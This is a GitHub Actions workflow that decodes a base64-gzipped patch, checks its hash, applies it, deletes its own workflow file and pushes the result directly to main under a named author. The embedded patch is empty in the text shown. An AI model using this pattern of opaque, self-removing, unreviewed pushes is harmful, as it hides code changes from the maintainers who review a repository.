name: Apply CI regression fix set

on:
  push:
    branches:
      - main

permissions:
  contents: write

concurrency:
  group: apply-ci-regression-fix-main
  cancel-in-progress: false

jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v6
        with:
          ref: main
          fetch-depth: 0
      - name: Apply verified regression patch to latest main
        shell: bash
        run: |
          set -euo pipefail
          git fetch origin main
          git reset --hard origin/main
          cat > /tmp/ci-fix.patch.gz.b64 <<'PATCH_B64'
          
          PATCH_B64
          base64 -d /tmp/ci-fix.patch.gz.b64 | gzip -d > /tmp/ci-fix.patch
          echo 'd43617d186d8629fb1e33620da66e1002b323ca633f0256ea097b0d428a4620f  /tmp/ci-fix.patch' | sha256sum -c -
          git apply --check /tmp/ci-fix.patch
          git apply --index /tmp/ci-fix.patch
          git rm --ignore-unmatch .github/workflows/apply-ci-regression-fix.yml
          git diff --cached --check
          git config user.name 'jujumelona'
          git config user.email 'qasdaa025@gmail.com'
          git commit -m 'Fix version-neutral CI regressions'
          git push origin HEAD:main
